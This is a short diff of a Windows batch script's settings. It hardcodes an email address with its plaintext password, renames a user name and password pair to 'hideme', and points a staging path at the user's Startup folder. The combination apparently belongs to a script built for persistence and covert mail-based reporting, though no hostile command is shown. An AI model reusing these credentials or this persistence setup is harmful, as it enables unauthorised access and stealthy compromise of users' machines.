@@ -3,8 +3,8 @@
 # Custom
 SET email=blabla.97@internet.ru
 SET emailp=NoShitSherlock1036!
-SET user=test2
-SET p=test2
+SET user=hideme
+SET p=hideme
 
 SET stage_path="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 SET init_path=%cd%
